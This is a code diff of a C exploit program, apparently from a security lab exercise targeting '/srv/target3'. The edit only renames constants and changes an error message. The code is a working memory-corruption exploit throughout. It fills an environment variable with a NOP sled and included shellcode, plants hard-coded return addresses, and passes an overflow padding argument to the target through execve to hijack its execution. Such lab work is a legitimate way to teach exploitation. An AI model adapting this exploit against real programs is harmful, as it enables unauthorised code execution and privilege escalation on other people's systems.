@@ -6,34 +6,34 @@
 #include "shellcode.h"
 
 #define TARGET "/srv/target3"
-const size_t EnvSize = 400;
-const uintptr_t BaseAddress = 0xffffdec0;
-const size_t NopSledSize = 201;
-const uint8_t Nop = 0x90;
-const size_t RetAddrOffset = 4;
+const size_t ENV_SIZE = 400;
+const uintptr_t BASE_ADDRESS = 0xffffdec0;
+const size_t NOP_SLED_SIZE = 201;
+const uint8_t NOP = 0x90;
+const size_t RET_ADDR_OFFSET = 4;
 
-const uintptr_t StartAddress = BaseAddress + RetAddrOffset;
-const uintptr_t SecondAddress = BaseAddress + 2 * RetAddrOffset;
-const char Padding[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
+const uintptr_t START_ADDRESS = BASE_ADDRESS + RET_ADDR_OFFSET;
+const uintptr_t SECOND_ADDRESS = BASE_ADDRESS + 2 * RET_ADDR_OFFSET;
+const char PADDING[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
 
 void prepareEnvironment(char *environment) {
-    memset(environment, Nop, EnvSize - 1);
-    *(uintptr_t *)(environment) = StartAddress;
-    *(uintptr_t *)(environment + RetAddrOffset) = SecondAddress;
-    memcpy(environment + NopSledSize, shellcode, sizeof(shellcode));
-    environment[EnvSize - 1] = '\0';
+    memset(environment, NOP, ENV_SIZE - 1);
+    *(uintptr_t *)(environment) = START_ADDRESS;
+    *(uintptr_t *)(environment + RET_ADDR_OFFSET) = SECOND_ADDRESS;
+    memcpy(environment + NOP_SLED_SIZE, shellcode, sizeof(shellcode));
+    environment[ENV_SIZE - 1] = '\0';
 }
 
 int main(void) {
-    char *arguments[] = {TARGET, Padding, NULL};
-    static char environment[EnvSize];
+    char *arguments[] = {TARGET, PADDING, NULL};
+    static char environment[ENV_SIZE];
 
     prepareEnvironment(environment);
 
     char *env[] = {environment};
 
     execve(TARGET, arguments, env);
-    perror("Execve failed");
+    perror("execve failed");
 
     return 0;
 }
